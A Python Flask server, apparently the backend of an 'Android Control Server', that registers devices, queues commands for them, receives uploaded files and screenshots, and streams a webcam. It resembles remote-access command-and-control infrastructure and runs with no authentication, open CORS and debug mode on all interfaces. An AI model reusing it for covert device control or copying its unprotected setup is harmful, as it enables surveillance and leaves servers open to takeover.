from flask import Flask, request, jsonify, Response, send_from_directory
from datetime import datetime
from flask_cors import CORS
import os
import uuid

app = Flask(__name__)
CORS(app)

# In-memory stores
devices = []
commands = {}  # device_id -> list of commands

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/")
def home():
    return "✅ Android Control Server is running."

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    device_id = data.get("device_id")

    # Check if already registered
    existing = next((d for d in devices if d["device_id"] == device_id), None)
    data["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if not existing:
        devices.append(data)
    else:
        existing.update(data)
        existing["last_seen"] = data["last_seen"]

    print(f"📲 Device registered: {data}")
    return jsonify({"message": "Device registered"}), 200

@app.route("/devices", methods=["GET"])
def get_devices():
    return jsonify(devices), 200

@app.route("/command", methods=["POST"])
def send_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")

    if not device_id or not command:
        return jsonify({"error": "Missing device_id or command"}), 400

    if device_id not in commands:
        commands[device_id] = []

    commands[device_id].append(command)
    print(f"📤 Command queued for {device_id}: {command}")
    return jsonify({"message": f"Command '{command}' sent to {device_id}"}), 200

@app.route("/get_commands/<device_id>", methods=["GET"])
def get_device_commands(device_id):
    cmds = commands.get(device_id, [])
    commands[device_id] = []  # Clear after fetching
    return jsonify(cmds), 200

@app.route("/upload/<device_id>", methods=["POST"])
def upload_file(device_id):
    if 'file' not in request.files:
        return jsonify({"error": "No file sent"}), 400

    file = request.files['file']
    ext = os.path.splitext(file.filename)[-1]
    filename = f"{device_id}_{uuid.uuid4()}{ext}"
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)

    print(f"📥 Received file from {device_id}: {filename}")
    return jsonify({"message": "File uploaded", "filename": filename}), 200

@app.route("/screenshot/<filename>", methods=["GET"])
def view_uploaded_screenshot(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

# Optional test stream endpoint (not tied to Android):
@app.route("/stream")
def video_stream():
    import cv2
    camera = cv2.VideoCapture(0)

    def gen_frames():
        while True:
            success, frame = camera.read()
            if not success:
                break
            _, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
